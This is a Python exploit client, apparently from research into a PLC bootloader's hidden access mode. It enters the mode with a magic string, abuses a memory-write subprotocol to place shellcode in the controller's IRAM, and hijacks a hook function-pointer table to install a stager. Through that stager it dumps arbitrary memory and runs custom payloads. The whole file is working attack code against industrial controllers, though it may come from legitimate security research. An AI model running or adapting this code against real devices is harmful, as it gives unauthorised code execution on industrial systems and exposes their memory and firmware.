#!/usr/bin/env python3
import struct
import time
import subprocess
import binascii

from pwn import remote, context, log, xor

context.update(log_level="info", bits=32, endian="big")

# --- Constants ---
SEND_REQ_SAFETY_SLEEP_AMT = 0.01
STAGER_PL_FILENAME = "payloads/stager/stager.bin"
DUMPMEM_PL_FILENAME = "payloads/dump_mem/build/dump_mem.bin"
FIRST_PAYLOAD_LOCATION = 0x10010100
MAX_MSG_LEN = 192 - 2
DEFAULT_STAGER_ADDHOOK_IND = 0x20
DEFAULT_SECOND_ADD_HOOK_IND = 0x1a
IRAM_STAGER_START = 0x10030100
IRAM_STAGER_END = 0x100303FC
IRAM_STAGER_MAX_SIZE = IRAM_STAGER_END - IRAM_STAGER_START
ANSW_ENTER_SUBPROTO_SUCCESS = b"\x80\x00"
ADD_HOOK_TABLE_START = 0x1003ABA0

SUBPROT_80_MODE_IRAM = 1
SUBPROT_80_IOC_SPI = 2
SUBPROT_80_MODE_FLASH = 3
SUBPROT_80_MODE_NOP = 4
SUBPROT_80_MODE_MAGICS = [None, 0x3BC2, 0x9d26, 0xe17a, 0xc54f]


class PlcClient:
    def __init__(self, host, port, log_callback=print):
        self.host = host
        self.port = port
        self.log_callback = log_callback
        self.r = None
        self.next_payload_location = FIRST_PAYLOAD_LOCATION

    def log(self, message):
        self.log_callback(message)

    def connect(self, switch_power=False, ps_host='powersupply', ps_port=80, ps_delay=10):
        if switch_power:
            self.log(f"Turning off power supply and sleeping for {ps_delay} seconds")
            try:
                subprocess.check_call(
                    ["tools/powersupply/switch_power.py", "--port", str(ps_port), "--host", ps_host, "off"])
                self.log("[+] Turned off power supply, sleeping")
                time.sleep(ps_delay)
                self.log("[+] Turned on power supply again")
                subprocess.check_call(
                    ["tools/powersupply/switch_power.py", "--port", str(ps_port), "--host", ps_host, "on"])
                self.log("[+] Successfully turned on power supply")
            except (subprocess.CalledProcessError, FileNotFoundError) as e:
                self.log(f"[!] Power switch command failed: {e}")
                self.log("[!] Ensure 'tools/powersupply/switch_power.py' is executable and configured.")
                return False

        self.log(f"Attempting to connect to {self.host}:{self.port}...")
        self.r = remote(self.host, self.port)

        magic = b"MFGT1"
        pad = b"A" * 4

        self.log("Sending magic string to enter special access mode...")
        for _ in range(100):
            self.r.send(pad + magic)
            answ = self.r.recv(256, timeout=0.3)
            if answ and b"-CPU" in answ:
                if not answ.startswith(b"\x05-CPU"):
                    answ = self.r.recv(256) + answ

                self.r.unrecv(answ)
                self.log("[+] Got connection")
                greeting = self._recv_packet()
                self.log(f"[+] Got special access greeting: {greeting.decode(errors='ignore')} [{binascii.hexlify(greeting).decode()}]")

                version_info = self.get_version()
                self.log(f"[+] Got PLC bootLoader version: {version_info}")

                return True
        self.log("[-] Failed to get special access greeting.")
        self.disconnect()
        return False

    def disconnect(self, continue_plc=False):
        if self.r:
            self.log("Saying bye...")
            try:
                if not continue_plc:
                    # In the original code, this was behind a raw_input,
                    # suggesting it might be good to pause before continuing the boot.
                    self.log("Pausing before sending bye...")
                    time.sleep(1)
                self._bye()
            except Exception as e:
                self.log(f"Error while saying bye: {e}")
            finally:
                self.r.close()
                self.r = None
                self.log("Connection closed.")

    def _calc_checksum_byte(self, incoming: bytes) -> bytes:
        return struct.pack("<i", -sum(incoming[:incoming[0]]))[0:1]

    def _send_packet(self, msg: bytes, step=2, sleep_amt=0.01):
        assert len(msg) <= MAX_MSG_LEN
        time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)

        msg = bytes([len(msg) + 1]) + msg
        msg += self._calc_checksum_byte(msg)

        self.log(f"sending packet: {binascii.hexlify(msg).decode()}")
        for i in range(0, len(msg), step):
            time.sleep(sleep_amt)
            self.r.send(msg[i:i + step])

    def _recv_packet(self) -> bytes:
        answ = self.r.recv(1)
        if not answ:
            return b''
        rem = answ[0]
        while rem != 0:
            add = self.r.recv(rem)
            rem -= len(add)
            answ += add

        if self._calc_checksum_byte(answ[:-1]) != answ[-1:]:
            self.log(f"Checksum validity failed. Got: {answ} [{binascii.hexlify(answ).decode()}]")
            return None
        else:
            return answ[1:-1]

    def _encode_packet_for_stager(self, chunk: bytes) -> bytes:
        for i in range(1, 256):
            key = bytes([i])
            if key not in chunk and i != len(chunk) + 2:
                encoded = key + xor(chunk, key)
                return encoded
        self.log(f"Could not encode chunk: {binascii.hexlify(chunk).decode()}")
        raise RuntimeError("Failed to encode chunk for stager")

    def _send_full_msg_via_stager(self, msg: bytes, chunk_size=2, sleep_amt=0.01):
        for i in range(0, len(msg), MAX_MSG_LEN - 1):
            time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
            chunk = msg[i:i + MAX_MSG_LEN - 1]
            self.log(f"Send progress: 0x{i:06x}/0x{len(msg):06x} ({float(i) / float(len(msg)):.2f})")
            self._send_packet(self._encode_packet_for_stager(chunk), chunk_size, sleep_amt)
            answ = self._recv_packet()
            if not len(answ) == 1:
                raise RuntimeError(f"Expecting empty ack package, got '{answ}' instead")
            if answ == b"\xff":
                self.log("[WARNING] Interrupting the sending...")
                return None
        self._send_packet(self._encode_packet_for_stager(b""))
        self._recv_packet()

    def _invoke_primary_handler(self, handler_ind, args=b"", await_response=True):
        payload = bytes([handler_ind]) + args
        self._send_packet(payload)
        if await_response:
            return self._recv_packet()
        return None

    def _enter_subproto_handler(self, mode):
        assert 1 <= mode < len(SUBPROT_80_MODE_MAGICS)
        return self._invoke_primary_handler(0x80, struct.pack(">H", SUBPROT_80_MODE_MAGICS[mode]))

    def _leave_subproto_handler(self):
        self._send_packet(b"\x81\xD0\x67")
        return self._recv_packet()

    def _raw_subproto_write(self, arg_dw, add_args, step=2, sleep_amt=0.01):
        self._send_packet(b"\x84\x5a\x2e" + struct.pack(">I", arg_dw) + add_args, step, sleep_amt)
        return self._recv_packet()

    def _exploit_write_chunk_to_iram(self, tar, contents, already_in_80_handler=False):
        assert len(contents) % 2 == 0
        assert len(contents) + 8 <= MAX_MSG_LEN
        assert 0x10000000 <= tar
        assert tar + len(contents) <= 0x10800000

        if not already_in_80_handler:
            self._enter_subproto_handler(SUBPROT_80_MODE_IRAM)

        target_argument = tar - 0x10000000

        self._raw_subproto_write(target_argument, len(contents) * b"\xff")

        if len(contents) == 4 and (contents[:2] in [b"\x00\x00", b"\x0a\x00"] or contents[2:4] in [b"\x00\x00", b"\x0a\x00"]):
            self._raw_subproto_write(target_argument, contents[:2])
            self._raw_subproto_write(target_argument + 2, contents[2:4])
        else:
            self._raw_subproto_write(target_argument, contents)

        if not already_in_80_handler:
            self._leave_subproto_handler()

    def _exploit_write_to_iram(self, tar, contents):
        assert len(contents) % 2 == 0
        assert 0x10000000 <= tar and tar + len(contents) <= 0x10800000

        answ = self._enter_subproto_handler(SUBPROT_80_MODE_IRAM)
        if answ != ANSW_ENTER_SUBPROTO_SUCCESS:
            raise RuntimeError(f"Failed to enter IRAM subprotocol. Got: {answ}")

        if len(contents) % 4 == 2:
            self._exploit_write_chunk_to_iram(tar, contents[:2], True)
            tar += 2
            contents = contents[2:]

        chunk_size = 16
        for i in range(0, len(contents), chunk_size):
            self.log(f"Writing {i:04x}/{len(contents):04x}")
            chunk = contents[i:i + chunk_size]
            self._exploit_write_chunk_to_iram(tar + i, chunk, True)

        self._leave_subproto_handler()

    def get_version(self):
        answ = self._invoke_primary_handler(0)
        return answ[2:3].decode() + ".".join([str(c) for c in answ[3:-2]])

    def _bye(self):
        answ = self._invoke_primary_handler(0xa2)
        if answ != b"\xa2\x00":
            self.log(f"Warning: Unexpected response to bye command: {answ}")

    def _invoke_add_hook(self, add_hook_no, args=b"", await_response=True):
        assert 0 <= add_hook_no <= 0x20
        hook_ind = 0x1c
        args = bytes([add_hook_no]) + args
        return self._invoke_primary_handler(hook_ind, args, await_response)

    def _install_add_hook(self, tar_addr, shellcode, add_hook_no):
        assert 0 <= add_hook_no <= 0x20
        if len(shellcode) % 2 != 0:
            shellcode += b"\xff"
        self._exploit_write_to_iram(tar_addr, shellcode)
        self._exploit_write_to_iram(ADD_HOOK_TABLE_START + 8 * add_hook_no + 2, b"\x00\xff" + struct.pack(">I", tar_addr))

    def install_stager(self, shellcode, tar_addr=IRAM_STAGER_START, add_hook_no=DEFAULT_STAGER_ADDHOOK_IND):
        assert 0 < len(shellcode) <= IRAM_STAGER_MAX_SIZE
        start_time = time.time()
        self.log("Installing the initial stager payload...")
        self._install_add_hook(tar_addr, shellcode, add_hook_no)
        self.log(f"Writing the initial stage took {time.time() - start_time:.2f} seconds")
        return add_hook_no

    def _write_via_stager(self, tar_addr, contents, stager_add_hook_ind=DEFAULT_STAGER_ADDHOOK_IND):
        self._invoke_add_hook(stager_add_hook_ind, struct.pack(">I", tar_addr), False)
        self._send_full_msg_via_stager(contents, 8, 0.01)

    def install_payload_via_stager(self, payload, stager_addhook_ind):
        start_time = time.time()
        self.log("Installing additional hook via stager...")

        add_hook_no = DEFAULT_SECOND_ADD_HOOK_IND
        tar_addr = self.next_payload_location

        # Set up function pointer
        self._write_via_stager(ADD_HOOK_TABLE_START + 8 * add_hook_no, b"\x00\x00\x00\xff" + struct.pack(">I", tar_addr), stager_addhook_ind)
        # Write payload code
        self._write_via_stager(tar_addr, payload, stager_addhook_ind)

        self.next_payload_location += len(payload)
        if self.next_payload_location % 4 != 0:
            self.next_payload_location += 4 - (self.next_payload_location % 4)

        self.log(f"Installing the additional hook took {time.time() - start_time:.2f} seconds")
        return add_hook_no

    def dump_memory(self, address, length, dump_payload):
        with open(STAGER_PL_FILENAME, "rb") as f:
            stager_code = f.read()
        stager_hook = self.install_stager(stager_code)

        dump_hook = self.install_payload_via_stager(dump_payload, stager_hook)

        self.log(f"Dumping {length} bytes of memory from 0x{address:08x}")
        answ = self._invoke_add_hook(dump_hook, b"A" + struct.pack(">II", address, length))

        if not answ or not answ.startswith(b"Ok"):
            raise RuntimeError(f"Failed to start memory dump. Response: {answ}")

        contents = b""
        stop = False
        while not stop:
            next_chunk = self._recv_packet()
            if next_chunk == b"":
                stop = True
            else:
                contents += next_chunk
                self.log(f"Read {len(contents)} bytes...")

        self.log(f"Successfully dumped {len(contents)} bytes.")
        return contents

    def run_test_payload(self, payload):
        with open(STAGER_PL_FILENAME, "rb") as f:
            stager_code = f.read()
        stager_hook = self.install_stager(stager_code)

        test_hook = self.install_payload_via_stager(payload, stager_hook)

        self.log("Invoking test payload...")
        answ = self._invoke_add_hook(test_hook)
        self.log(f"Got answer: {answ.decode(errors='ignore')}")
        return answ

    def run_tictactoe(self, payload, input_callback, output_callback):
        with open(STAGER_PL_FILENAME, "rb") as f:
            stager_code = f.read()
        stager_hook = self.install_stager(stager_code)

        game_hook = self.install_payload_via_stager(payload, stager_hook)

        self.log("[*] Starting Tic-Tac-Toe...")
        self._invoke_add_hook(game_hook, await_response=False)

        msg_buffer = ""
        END_TOKEN = "==>"
        while END_TOKEN not in msg_buffer:
            msg_bytes = self._recv_packet()
            if not msg_bytes:
                break
            msg = msg_bytes.decode(errors='ignore')
            output_callback(msg)
            msg_buffer += msg

            if "enter a number" in msg:
                choice = input_callback() # Ask GUI for input
                self._send_packet(choice.encode())

        self.log("[*] Game over!")
